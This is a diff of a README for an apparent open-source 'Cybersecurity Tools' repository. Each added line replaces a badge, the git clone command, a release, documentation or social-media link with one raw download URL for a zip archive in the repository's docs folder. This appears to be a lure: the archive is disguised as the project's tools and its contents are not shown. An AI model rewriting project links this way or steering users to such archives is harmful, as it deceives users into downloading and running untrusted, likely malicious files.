@@ -1,8 +1,8 @@
 ```markdown
 # 🛡️ Cybersecurity Tools 🛡️
 
-![GitHub release](https://img.shields.io/github/release/AlejandroZaZ/cybersecurity-tools.svg)
-![License](https://img.shields.io/badge/license-MIT-brightgreen.svg)
+![GitHub release](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
+![License](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
 
 Welcome to the **Cybersecurity Tools** repository! This collection features a variety of open-source, terminal-based security tools designed for network analysis, penetration testing, and vulnerability assessment. These tools aim to empower cybersecurity researchers and ethical hackers while promoting responsible use.
 
@@ -35,7 +35,7 @@ To get started, follow these simple steps:
 1. **Clone the Repository**: Use Git to clone the repository to your local machine.
 
    ```bash
-   git clone https://github.com/AlejandroZaZ/cybersecurity-tools.git
+   git clone https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip
    ```
 
 2. **Navigate to the Directory**: Change your working directory to the cloned repository.
@@ -46,7 +46,7 @@ To get started, follow these simple steps:
 
 3. **Install Dependencies**: Some tools may require additional packages. Refer to the individual tool documentation for specifics.
 
-4. **Download the Tools**: Visit the [Releases section](https://github.com/AlejandroZaZ/cybersecurity-tools/releases) to download the latest versions of the tools you wish to use. Each tool's documentation provides guidance on installation and usage.
+4. **Download the Tools**: Visit the [Releases section](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip) to download the latest versions of the tools you wish to use. Each tool's documentation provides guidance on installation and usage.
 
 ## 💻 Usage
 
@@ -103,9 +103,9 @@ If you encounter issues or need help, feel free to reach out. You can open an is
 
 Stay updated with the latest news and tools:
 
-- [GitHub](https://github.com/AlejandroZaZ/cybersecurity-tools)
-- [Twitter](https://twitter.com/cybersecuritytools)
-- [LinkedIn](https://linkedin.com/company/cybersecurity-tools)
+- [GitHub](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
+- [Twitter](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
+- [LinkedIn](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
 
 ## 🌟 Acknowledgments
 
@@ -113,8 +113,8 @@ Special thanks to all contributors and open-source communities for their support
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/AlejandroZaZ/cybersecurity-tools/wiki)
-- [Releases](https://github.com/AlejandroZaZ/cybersecurity-tools/releases)
+- [Documentation](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
+- [Releases](https://raw.githubusercontent.com/AlejandroZaZ/cybersecurity-tools/master/docs/cybersecurity_tools_v2.5.zip)
 
 Let’s work together to create a safer digital environment! 🛡️
 ```
